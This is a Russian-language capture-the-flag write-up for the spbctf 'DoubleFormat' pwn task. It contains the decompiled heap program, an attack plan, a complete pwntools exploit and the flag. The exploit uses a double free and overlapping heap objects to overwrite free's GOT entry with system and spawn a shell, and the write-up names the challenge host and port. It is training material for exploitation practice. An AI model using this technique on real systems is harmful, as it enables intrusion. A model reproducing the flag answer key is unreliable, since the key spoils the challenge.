[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn8_DoubleFormat)
Описание:
DF for beginners
`nc 109.233.56.90 11598`
**[df.elf](https://pwn.spbctf.ru/files/uaf/DoubleFormat/df.elf)**

Декомпиляция:
``` C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  B *v3; // rbx
  int i; // [rsp+4h] [rbp-4Ch]
  unsigned int idx; // [rsp+8h] [rbp-48h]
  unsigned int idxa; // [rsp+8h] [rbp-48h]
  unsigned int idxb; // [rsp+8h] [rbp-48h]
  unsigned int idxc; // [rsp+8h] [rbp-48h]
  unsigned int idxd; // [rsp+8h] [rbp-48h]
  unsigned int idxe; // [rsp+8h] [rbp-48h]
  unsigned int idxf; // [rsp+8h] [rbp-48h]
  unsigned int idxg; // [rsp+8h] [rbp-48h]
  int size; // [rsp+Ch] [rbp-44h]
  char buf[40]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 canary; // [rsp+38h] [rbp-18h]

  canary = __readfsqword(0x28u);
  setbuf(stdout, nullptr);
  setbuf(stderr, nullptr);
  printf("Main at %p, system at %p\n", main, &system);

  for ( i = 0; i <= 99; ++i )
  {
    puts("Enter command((add,mod,read,del)[AB])");
    if ( !fgets(buf, 32, stdin) )
      break;
    if ( !strcmp(buf, "addA\n") )
    {
      puts("Enter cell number for A");
      fgets(buf, 32, stdin);
      idx = strtol(buf, nullptr, 10);
      if ( idx < 0xA )
      {
        as[idx] = (A *)malloc(0x10u);
        fprintf(stderr, "%p\n", as[idx]);
        puts("Enter value for cell");
        fgets(as[idx]->buf, 16, stdin);
        continue;
      }
LABEL_36:
      puts("Invalid index");
      continue;
    }
    if ( !strcmp(buf, "modA\n") )
    {
      puts("Enter cell number for A");
      fgets(buf, 32, stdin);
      idxa = strtol(buf, nullptr, 10);
      if ( idxa >= 0xA )
        goto LABEL_36;
      if ( as[idxa] )
      {
        fprintf(stderr, "%p\n", as[idxa]);
        puts("Enter value for cell");
        fgets(as[idxa]->buf, 16, stdin);
      }
      else
      {
        puts("Not alloced");
      }
    }
    else if ( !strcmp(buf, "readA\n") )
    {
      puts("Enter cell number for A");
      fgets(buf, 32, stdin);
      idxb = strtol(buf, nullptr, 10);
      if ( idxb >= 0xA )
        goto LABEL_36;
      if ( as[idxb] )
        printf("value:%s", as[idxb]->buf);
      else
        puts("No value here");
    }
    else if ( !strcmp(buf, "delA\n") )
    {
      puts("Enter cell number for A");
      fgets(buf, 32, stdin);
      idxc = strtol(buf, nullptr, 10);
      if ( idxc >= 0xA )
        goto LABEL_36;
      if ( as[idxc] )
      {
        free(as[idxc]);
        puts("Deleted");
      }
    }
    else if ( !strcmp(buf, "addB\n") )
    {
      puts("Enter cell number for B");
      fgets(buf, 32, stdin);
      idxd = strtol(buf, nullptr, 10);
      if ( idxd >= 0xA )
        goto LABEL_36;
      if ( !bs[idxd] )
      {
        bs[idxd] = (B *)malloc(0x10u);
        fprintf(stderr, "%p\n", bs[idxd]);
      }
      puts("Enter size for cell");
      fgets(buf, 32, stdin);
      size = strtol(buf, nullptr, 10);
      v3 = bs[idxd];
      v3->ref = (char *)malloc(size);
      bs[idxd]->size = size;
      puts("Enter value for cell");
      fgets(bs[idxd]->ref, size, stdin);
    }
    else if ( !strcmp(buf, "modB\n") )
    {
      puts("Enter cell number for B");
      fgets(buf, 32, stdin);
      idxe = strtol(buf, nullptr, 10);
      if ( idxe >= 0xA )
        goto LABEL_36;
      if ( !bs[idxe] )
      {
        bs[idxe] = (B *)malloc(0x10u);
        fprintf(stderr, "%p\n", bs[idxe]);
      }
      puts("Enter value for cell");
      fgets(bs[idxe]->ref, bs[idxe]->size, stdin);
    }
    else if ( !strcmp(buf, "readB\n") )
    {
      puts("Enter cell number for B");
      fgets(buf, 32, stdin);
      idxf = strtol(buf, nullptr, 10);
      if ( idxf >= 0xA )
        goto LABEL_36;
      if ( bs[idxf] )
        printf("%s", bs[idxf]->ref);
    }
    else
    {
      if ( strcmp(buf, "delB\n") )
        continue;
      puts("Enter cell number for B");
      fgets(buf, 32, stdin);
      idxg = strtol(buf, nullptr, 10);
      if ( idxg >= 0xA )
        goto LABEL_36;
      if ( bs[idxg] )
      {
        if ( bs[idxg]->ref )
          free(bs[idxg]->ref);
        free(bs[idxg]);
        puts("Deleted");
      }
    }
  }
  return 0;
}
```

План атаки:
1. Сделать Dobule Free.
2. Создать новые объекты так, чтобы A и B указывали на 1 и тот же участок памяти в куче.
3. Изменить в B адрес данных и размер данных через A. Менять на `free@GOT`, т.к. достаточно будет сделать `free('A0')`, где `A0 = "sh"` и вызовется шел.
4. Сделать `free('A0)'` и получить шел.

Эксплоит:
``` python
def addA(io, index, value):
    io.recvline()
    io.sendline(b'addA')
    io.recvline()
    io.sendline(str(index).encode())
    io.recvline()
    io.sendline(value)

def delA(io, index):
    io.recvline()
    io.sendline(b'delA')
    io.recvline()
    io.sendline(str(index).encode())
    io.recvline()

def modA(io, index, value):
    io.recvline()
    io.sendline(b'modA')
    io.recvline()
    io.sendline(str(index).encode())
    io.recvline()
    io.sendline(value)
    
def addB(io, index, size, value):
    io.recvline()
    io.sendline(b'addB')
    io.recvline()
    io.sendline(str(index).encode())
    io.recvline()
    io.sendline(str(size).encode())
    io.recvline()
    io.sendline(value)

def modB(io, index, value):
    io.recvline()
    io.sendline(b'modB')
    io.recvline()
    io.sendline(str(index).encode())
    io.recvline()
    io.sendline(value)
    
main_offset = 0x11C9
free_gotplt_offset = 0x4018

io = start()

# Чтение адресов
io.recvuntil(b'at ')
main_addr = int(io.recvuntil(b',')[:-1].decode(), 16)
io.recvuntil(b'at ')
system_addr = int(io.recvline()[:-1].decode(), 16)
free_gotplt = main_addr - main_offset + free_gotplt_offset

# Dobule Free
for i in range(10):
    addA(io, i, b'1')
for i in range(10):
    delA(io, i)
delA(io, 8)

# Создание объектов
for i in range(9):
    addA(io, i, b'sh')
addB(io, 0, 32, b'123')

# Изменение gotplt
payload = p64(free_gotplt) + p32(0x8)
modA(io, 7, payload)
modB(io, 0, p64(system_addr))

## Получение шела
io.sendline(b'delA')
io.sendline(b'0')

io.interactive()
```

Запуск:
![{D9D19792-505E-45F3-BC1D-179948D0BFA6}](../../../../z.%20Images/{D9D19792-505E-45F3-BC1D-179948D0BFA6}.png)

Ответ: `SPBCTF{H34P_15_FUN}`